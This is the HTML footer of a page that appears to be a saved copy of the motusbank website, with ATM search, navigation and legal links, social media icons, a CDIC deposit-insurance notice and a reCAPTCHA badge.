                    <div class="small-12 medium-4 xlarge-4 cell medium-text-center xlarge-text-center">
                      <a class="button accent-background search click-search" href="https://www.motusbank.ca/find-an-atm.aspx?search=" title="Find an ATM">Find an ATM</a>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
  
  <div class="motus-bank-container pre-footer">
    <div class="grid-x" style="display:none">
      <div class="small-12 cell">
        <div class="grid-container full">
          <div class="grid-x">
            <div class="small-12 cell">
              <h5>FIND AN ATM</h5>
            </div>
            <div class="small-12 cell location-search">
              <div class="grid-x grid-margin-x">
                <div class="small-12 medium-5 large-4 xlarge-3 medium-text-center cell">
                  <a class="button locate carbon-background" title="Use my current location" href="https://www.motusbank.ca/find-an-atm?search=here">Use my Current location</a>
                </div>
                <div class="small-12 medium-7 large-8 xlarge-9 cell">
                  <div class="grid-x grid-margin-x">
                    <div class="small-12 medium-6 large-7 medium-text-center xlarge-4 cell">
                      <input placeholder="City or postal code" type="text" name="location" id="locBtn2" class="searchInpt accent-border" autocomplete="off">
                    </div>
                    <div class="small-12 medium-6 large-5 xlarge-3 cell medium-text-center xlarge-text-center">
                      <a class="accent-background carbon-text button search" href="https://www.motusbank.ca/find-an-atm.aspx" title="Find an ATM">Find an ATM</a>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div class="motus-bank-container">
      
      <div class="motus-bank-row">
        <div class="grid-x promo promo-mobile padding-bottom-for-tablet" id="promo-desktop">
          <div class="small-12 large-9 xlarge-10 cell">
            <div class="grid-container full">
              <div class="grid-x">
                <div class="small-4 xlarge-2 cell">
                  <h5>About us</h5>
                  <ul>
                    <li>
                      <a href="https://www.motusbank.ca/About-Us/Our-Story">Our story</a>
                    </li>
                    <li>
                      <a href="https://www.motusbank.ca/About-Us/Careers">Careers</a>
                    </li>
                    <li>
                      <a href="https://www.motusbank.ca/About-Us/Our-Story/News">News</a>
                    </li>
                    <li>
                      <a href="https://www.motusbank.ca/About-Us/Corporate-Governance">Corporate governance</a>
                    </li>
                  </ul>
                </div>
                <div class="small-4 xlarge-2 cell">
                  <h5>Accounts</h5>
                  <ul>
                    <li>
                      <a href="https://www.motusbank.ca/Accounts/Savings">Savings</a>
                    </li>
                    <li>
                      <a href="https://www.motusbank.ca/Accounts/Chequing">Chequing</a>
                    </li>
                    <li>
                      <a href="https://www.motusbank.ca/Accounts/Investing">Investing</a>
                    </li>
                    <li>
                      <a href="https://www.motusbank.ca/Accounts/Mortgages">Mortgages</a>
                    </li>
                    <li class="margin-push">
                      <a href="https://www.motusbank.ca/Accounts/Borrowing">Borrowing</a>
                    </li>
                  </ul>
                </div>
                <div class="small-4 xlarge-2 cell">
                  <h5>Support</h5>
                  <ul>
                    <li>
                      <a href="https://www.motusbank.ca/Support/Contact-Us">Contact us</a>
                    </li>
                    <li>
                      <a href="https://www.motusbank.ca/Support/Helpful-Tools">Helpful tools</a>
                    </li>
                    <li>
                      <a href="https://www.motusbank.ca/Support/Rates">Rates</a>
                    </li>
                    <li>
                      <a href="https://www.motusbank.ca/Support/Site-Map">Site map</a>
                    </li>
                  </ul>
                </div>
                <div class="small-4 xlarge-2 cell">
                  <h5>Community</h5>
                  <ul>
                    <li>
                      <a href="https://www.motusbank.ca/Community/Good-to-Know">Good to know</a>
                    </li>
                  </ul>
                </div>
                <div class="small-5 medium-4 cell">
                  <h5>Legal stuff</h5>
                  <ul>
                    <li>
                      <a href="https://www.motusbank.ca/Legal-Stuff/Privacy-Security">Privacy &amp; security</a>
                    </li>
                    <li>
                      <a href="https://www.motusbank.ca/Legal-Stuff/Accessibility">Accessibility</a>
                    </li>
                    <li>
                      <a href="https://www.motusbank.ca/Legal-Stuff/Legal">Legal</a>
                    </li>
                    <li>
                      <a href="https://www.motusbank.ca/Legal-Stuff/CDIC-Deposit-Insurance-Information">CDIC deposit insurance information</a>
                    </li>
                    <li>
                      <a href="https://www.motusbank.ca/Legal-Stuff/Terms">Terms</a>
                    </li>
                  </ul>
                </div>
              </div>
            </div>
          </div>
          
          <div class="small-12 large-3 xlarge-2 cell">
            <div class="grid-container full">
              <div class="grid-x">
                <h5>Social media</h5>
                <div class="social-links-footer">
                  <a href="https://www.facebook.com/motusbank/" target="_blank" rel="noopener noreferrer" title="Join us on Facebook">
                    <svg xmlns="https://www.w3.org/2000/svg" xlink="https://www.w3.org/1999/xlink">
                      <use xlink:href="#facebook" href="#facebook"></use>
                    </svg>
                  </a>
                  <a href="https://twitter.com/motusbank" target="_blank" rel="noopener noreferrer" title="Join us on Twiiter">
                    <svg xmlns="https://www.w3.org/2000/svg" xlink="https://www.w3.org/1999/xlink">
                      <use xlink:href="#twitter" href="#twitter"></use>
                    </svg>
                  </a>
                  <a href="https://www.linkedin.com/company/motusbank/" target="_blank" rel="noopener noreferrer" title="Join us on LinkedIn">
                    <svg xmlns="https://www.w3.org/2000/svg" xlink="https://www.w3.org/1999/xlink">
                      <use xlink:href="#linkedin" href="#linkedin"></use>
                    </svg>
                  </a>
                  <a href="https://www.instagram.com/motusbank/" target="_blank" rel="noopener noreferrer" title="Join us on Instagram">
                    <svg xmlns="https://www.w3.org/2000/svg" xlink="https://www.w3.org/1999/xlink">
                      <use xlink:href="#instagram" href="#instagram"></use>
                    </svg>
                  </a>
                </div>
              </div>
            </div>
          </div>
        </div>
        
      </div>
    </div>
  </div>
  <div class="cdic">
    <p class="carbon-text">motusbank is a member of Canada Deposit Insurance Corporation (CDIC) <a href="https://www.cdic.ca/SiteAssets/financial-community/protecting-your-deposits.aspx" target="_blank" rel="noopener noreferrer"><img alt="Deposit Protection" class="cdic-svg-height" src="files/deposit-Protection2x.png"></a></p>

  </div>
  <div class="grid-container post-footer">
    <div class="grid-x grid-margin-x" id="no-margin">
      
      <div class="small-12 cell text-center">
        <div>
          <a href="https://www.motusbank.ca/">
            <img class="motus-svg main" src="files/small_motus-logo.svg" alt="motusbank">
          </a>
          <h4>where banking feels good</h4>
        </div>
        <p>Copyright © 2021 Motus Bank.
          <br>
          <sup>™</sup> Trademarks of Motus Bank. All&nbsp;rights&nbsp;reserved.
        </p>
      </div>
    </div>
    
    
  </div>
  <img id="p_lt_ctl08_EditableImage_ucEditableImage_imgImage" src="files/footer-spiral5-DT2x.png" alt="">


</footer>


    
    

</form>


<div><div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s ease 0s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px;"><div class="grecaptcha-logo"><iframe src="files/anchor.htm" role="presentation" name="a-qzakjhvgfv8f" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" width="256" height="60" frameborder="0"></iframe></div><div class="grecaptcha-error"></div><textarea id="g-recaptcha-response-100000" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;">03AOLTBLTrsHOoP2t36MC5Meau-hifxHB2PRuQKB29juP9qr482s-XETqMNUMGgSKIHOmFWmCJGtlsePeD_jrBpCy9lL0gR5XCzNFQ4hd6qBJtdznaDVCl0y7peWQGfeeGMY_veKWmeSe8buOAyLKehKiKShmtkkFHHsBSSgc7wzV1KpG1zjQlXcApTRVoax3QlEI1yoScQ_zOL636zZ-PFMQvQ8wvFeON7BS86KLAyK4bsgYZwZsccbkAxmu-2TQxD1TVMxdAMVbbxxuxhpnmR78LhYQ6RVt6XZ3Gk7yJdVrA0HXtQZSAkV4OIriZ8Aj6wRBoHwb6_HIR</textarea></div></div>
</body></html>